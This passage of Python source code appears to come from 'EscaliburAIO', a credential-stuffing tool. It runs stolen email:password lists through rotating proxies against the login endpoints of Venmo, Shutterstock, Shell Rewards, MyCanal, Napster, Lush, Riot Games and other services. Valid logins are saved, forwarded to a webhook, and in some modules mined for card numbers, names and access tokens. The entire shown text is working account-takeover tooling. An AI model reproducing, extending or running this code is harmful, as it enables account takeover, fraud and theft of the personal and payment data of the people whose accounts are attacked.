                elif "status\":\"SUCCESS" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                else:
                    threading.Thread(target=silvertv_check, args=(emails, passwords, proxylist,)).start()
        except:
            errors+=1
            threading.Thread(target=silvertv_check, args=(emails, passwords, proxylist,)).start()
    def silvertv():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="SilverTV"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=silvertv_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def shutterstock_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://accounts.shutterstock.com/login?hl=en"

                content = ""

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "Accept":"*/*",
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                    "Pragma":"no-cache" 
                }

                f = sess.get(url, data=content, headers=headers)
                if "RECAPTCHA_REQUIRED" or "Too Many Requests" or "Something went wrong." in f.text:
                        banned+=1
                        cpm+=1
                        checked+=1
                        open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    csrf = search(r'=\"_csrf\" value=\"(.*?)\"', str(f.text)).group(1)
                    url = "https://accounts.shutterstock.com/login?hl=en"
                    content = f"_csrf={csrf}&site=photo&username={email}&password={password}" 
                    headers = {
                        "Content-Type":"application/x-www-form-urlencoded", 
                        "Accept":"*/*", 
                        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                        "Pragma":"no-cache", 
                        "Referer":"https://www.shutterstock.com/", 
                        "Origin":"https://www.shutterstock.com", 
                        "X-Requested-With":"XMLHttpRequest" 
                    }
                    r = sess.post(url, data=content, headers=headers)
                    if "ERROR_INCORRECT_USERNAME_PASSWORD" or "User is required to reset their password" or "This account has been suspended" in r.text:
                        bad+=1
                        cpm+=1
                        checked+=1
                        open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    elif "RECAPTCHA_REQUIRED" or "Too Many Requests" or "Something went wrong." in r.text:
                        banned+=1
                        cpm+=1
                        checked+=1
                        open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    elif "customer_id" in r.text:
                        good+=1
                        cpm+=1
                        checked+=1
                        open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                        webhook("{}:{}".format(email, password))
                    else:
                        threading.Thread(target=shutterstock_check, args=(emails, passwords, proxylist,)).start()
        except:
            errors+=1
            threading.Thread(target=shutterstock_check, args=(emails, passwords, proxylist,)).start()
    def shutterstock():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="ShutterStock"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=shutterstock_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def shellrewards_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://id.consumer.shell.com/api/v2/account/login" 

                content = {"email":email,"password":password,"udid":"no-udid-provided"}

                headers = {
                    "Content-Type":"application/json;charset=UTF-8", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                    "Pragma":"no-cache", 
                    "Accept":"*/*", 
                    "Channel":"Web", 
                    "X-SSO-Market":"en-GB", 
                    "Authorization":"Basic 462a782dc8add106f3ade2b567f51a434fd852aee9a58d32c2c629b263f8703d" 
                }

                r = sess.post(url, json=content, headers=headers)

                if "incorrect_username_or_password_please_try_again"  in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "loyalty\":{\"accounts" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                    cardnumber = search(r'cardId\":\"(.*?)\",\"cardEnabled', str(r.text)).group(1)
                    cardenabled = search(r'cardEnabled\":(.*?),\"cardType', str(r.text)).group(1)
                    open("results/{}/capture.txt".format(today), "a+").write("{}:{} | Card-Enabled: {} | Card-Number: {} |\n".format(email, password, cardenabled, cardnumber))
                else:
                    threading.Thread(target=shellrewards_check, args=(emails, passwords, proxylist,)).start()
        except:
            errors+=1
            threading.Thread(target=shellrewards_check, args=(emails, passwords, proxylist,)).start()
    def shellrewards():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Shell Rewards"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=shellrewards_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def rdpzone_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://my.paysafecard.com/mypins-psc//login.xhtml"

                content = f"token=36abe0786d188c52027899bc66302390d6037d42&username={email}&password={password}"

                headers = { 
                    "Content-Type":"application/x-www-form-urlencoded" ,
                    "Accept":"*/*" ,
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                    "Pragma":"no-cache" ,
                    "Host":"www.rdpzone.com" ,
                    "Connection":"keep-alive" ,
                    "Cache-Control":"max-age=0" ,
                    "Origin":"https://www.rdpzone.com" ,
                    "Upgrade-Insecure-Requests":"1" ,
                    "DNT":"1" ,
                    "Content-Type":"application/x-www-form-urlencoded" ,
                    "User-Agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.96 Safari/537.36", 
                    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", 
                    "Referer":"https://www.rdpzone.com/billing/clientarea.php", 
                    "Accept-Language":"en,en-US;q=0.9,ar;q=0.8" ,
                    "Cookie":"__zlcmid=qmi0QIzoMKVaXm; WHMCSQ5zygMZt1JOi=tmrj43cvls7qllc7clj3hph5g1", 
                    "Accept-Encoding":"gzip, deflate" 
                }
                r = sess.post(url, data=content, headers=headers, allow_redirects=True)
                if "Login Details Incorrect. Please try again." in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "\"dropdown account\""  in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                else:
                    threading.Thread(target=rdpzone_check, args=(emails, passwords, proxylist,)).start()
        except:
            errors+=1
            threading.Thread(target=rdpzone_check, args=(emails, passwords, proxylist,)).start()
    def rdpzone():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="RDPZone"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=rdpzone_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def mycanal_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                import urllib.parse
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies=proxy_line
                
                url = "https://pass-api-v2.canal-plus.com/services/apipublique/login" 
                content = f"email={email}&password={password}&portailId=OQaRQJQkSdM.&media=Android%20Phone&vect=Internet" 
                headers = {
                    "Content-Type":"application/x-www-form-urlencoded" ,
                    "Accept": "*/*" ,
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                    "Pragma":"no-cache" 
                }
                
                r = sess.post(url, data=content, headers=headers)

                if "s_pass_token"  in r.text or "\"errorCode\":0" in r.text or "Le mot de passe doit être mis à jour" in r.text or "Compte non active ou en attente de certification" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                elif "name=\"error\" value=\"invalidCredentials"  in r.text or "Login ou mot de passe invalide" in r.text or "Compte bloque" in r.text or "Password manquant" in r.text or "Email manquant ou invalide" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    print(r.text)
                    threading.Thread(target=mycanal_check, args=(emails, passwords, proxylist,)).start()
        except:
            errors+=1
            threading.Thread(target=mycanal_check, args=(emails, passwords, proxylist,)).start()
    def mycanal():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="MyCanal"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=mycanal_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def venmo_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                import urllib.parse
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies=proxy_line
                
                url = "https://venmo.com/login" 
                before, after = email.split('@')[0], email.split('@')[1]
                content = f"return_json=true&password={password}&phoneEmailUsername={before}%40{after}"
                headers = {
                    "Host":"venmo.com",
                    "Connection":"keep-alive",
                    "Accept":"application/json",
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
                    "Content-Type":"application/x-www-form-urlencoded",
                    "Origin":"https://venmo.com",
                    "Sec-Fetch-Site":"same-origin",
                    "Sec-Fetch-Mode":"cors",
                    "Sec-Fetch-Dest":"empty",
                    "Referer":"https://venmo.com/",
                    "Accept-Language":"en-US,en;q=0.9",
                    "Accept-Encoding":"gzip, deflate",
                    "Content-Length":"69"
                }
                
                r = sess.post(url, data=content, headers=headers)

                if "device" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                elif "Your email or password was incorrect." in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=venmo_check, args=(emails, passwords, proxylist,)).start()
        except:
            errors+=1
            threading.Thread(target=venmo_check, args=(emails, passwords, proxylist,)).start()
    def venmo():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Venmo"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=venmo_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def antipublic_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies=proxy_line
                
                url = "https://digibody.avast.com/v1/web/leaks" 
                content = {"email":f"{email}"}
                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                    "Pragma":"no-cache", 
                    "Accept":"*/*" 
                }

                r = sess.post(url, json=content, headers=headers)

                if not "leak_id" in r.text or not "domain" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                elif "domain" in r.text or "The stolen data contains " in r.text or "leak_id" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=venmo_check, args=(emails, passwords, proxylist,)).start()
        except:
            errors+=1
            threading.Thread(target=venmo_check, args=(emails, passwords, proxylist,)).start()
    def antipublic():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="AntiPublic"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=antipublic_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def napster_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = f"https://direct.rhapsody.com/authserver/v3/useraccounts?userName={email}"
                content = ""

                headers = {
                    "Content-Type":"application/json", 
                    "Accept":"*/*", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                    "Pragma":"no-cache", 
                    "x-rds-authentication":f"{password}", 
                    "x-rds-devkey":"4B8C5B7B5B7B5I4H", 
                    "Authorization":"Basic cmhhcGNvbToyWTZIWTJxYlRURnltb1llcmZ1Wg==" 
                }

                r = sess.post(url, data=content, headers=headers)

                if "parentalControlEnabled=\"false\"" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                    subscribtion = search(r'marketName=\"(.*?)\"', str(r.text)).group(1)
                    open("results/{}/capture.txt".format(today), "a+").write("{}:{} | Subscribtion: {} |\n".format(email, password, subscribtion))
                elif r.status_code == "200":
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                    subscribtion = search(r'marketName=\"(.*?)\"', str(r.text)).group(1)
                    open("results/{}/capture.txt".format(today), "a+").write("{}:{} | Subscribtion: {} |\n".format(email, password, subscribtion))
                elif "tierCode=\"R25\"" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif r.status_code == "204" or "400" or "403":
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=napster_check, args=(emails, passwords, proxylist,)).start()
        except:
            errors+=1
            threading.Thread(target=napster_check, args=(emails, passwords, proxylist,)).start()
    def napster():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Napster"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=napster_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def lush_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://uk.lush.com/user/login?destination="

                content = "name={}&form_build_id=form-vAu6UP5Jm6s5dNkSspzVjdfsDS1M3Ji_8Dj5E_2MhqQ&form_id=user_login&pass={}&op=CONTINUE" .format(email, password)

                headers = {
                "Content-Type":"application/x-www-form-urlencoded", 
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                "Pragma":"no-cache", 
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
                }

                r = sess.post(url, data=content, headers=headers)

                if "Good try, but not quite right. Your username or password is unrecognised"  in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "<div class=\"sitewide_header_user_name\">" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                    url = "https://uk.lush.com/my-account"
                    headers = {
                        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                        "Pragma":"no-cache", 
                        "Accept":"*/*" 
                    }
                    f = sess.get(url, headers=headers)
                    firstname = search(r'<span class=\"first-name\">(.*?)</span>', str(f.text)).group(1)    
                    lastname = search(r'<span class=\"surname\">(.*?)</span>', str(f.text)).group(1) 
                    open("results/{}/capture.txt".format(today), "a+").write("{}:{} | First-Name: {} | Last-Name: {} |\n".format(email, password, firstname, lastname)) 
                else:
                    threading.Thread(target=lush_check, args=(emails, passwords, proxylist,)).start()
        except:
            errors+=1
            threading.Thread(target=lush_check, args=(emails, passwords, proxylist,)).start()
    def lush():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Lush"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=lush_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def lol_na_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://auth.riotgames.com/token"

                content = "client_assertion_type=urn%3Aietf%3Aparams%3Aoauth%3Aclient-assertion-type%3Ajwt-bearer&client_assertion=eyJhbGciOiJSUzI1NiJ9.eyJhdWQiOiJodHRwczpcL1wvYXV0aC5yaW90Z2FtZXMuY29tXC90b2tlbiIsInN1YiI6ImxvbCIsImlzcyI6ImxvbCIsImV4cCI6MTYwMTE1MTIxNCwiaWF0IjoxNTM4MDc5MjE0LCJqdGkiOiIwYzY3OThmNi05YTgyLTQwY2ItOWViOC1lZTY5NjJhOGUyZDcifQ.dfPcFQr4VTZpv8yl1IDKWZz06yy049ANaLt-AKoQ53GpJrdITU3iEUcdfibAh1qFEpvVqWFaUAKbVIxQotT1QvYBgo_bohJkAPJnZa5v0-vHaXysyOHqB9dXrL6CKdn_QtoxjH2k58ZgxGeW6Xsd0kljjDiD4Z0CRR_FW8OVdFoUYh31SX0HidOs1BLBOp6GnJTWh--dcptgJ1ixUBjoXWC1cgEWYfV00-DNsTwer0UI4YN2TDmmSifAtWou3lMbqmiQIsIHaRuDlcZbNEv_b6XuzUhi_lRzYCwE4IKSR-AwX_8mLNBLTVb8QzIJCPR-MGaPL8hKPdprgjxT0m96gw&grant_type=password&username=NA1|{}&password={}&scope=openid offline_access lol ban profile email phone".format(email, password)

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "Accept":"application/json", 
                    "User-Agent":"RiotClient/18.0.0 (rso-auth)", 
                    "Pragma":"no-cache" 
                }
                r = sess.post(url, data=content, headers=headers, allow_redirects=True)


                if "access_token" in r.text:
                    token = search(r'access_token\":\"(.*?)\",\"', str(r.text)).group(1)    
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                    url = "https://store.na2.lol.riotgames.com/storefront/v3/history/purchase?language=en_US"
                    headers = {
                        "Content-Type":"application/x-www-form-urlencoded", 
                        "Accept":"application/json", 
                        "User-Agent":"RiotClient/18.0.0 (lol-store)", 
                        "Pragma":"no-cache", 
                        "Authorization":f"Bearer {token}" 
                    }
                    content = ""
                    f = sess.get(url, data=content, headers=headers)
                    if "Summoner not created" in f.text:
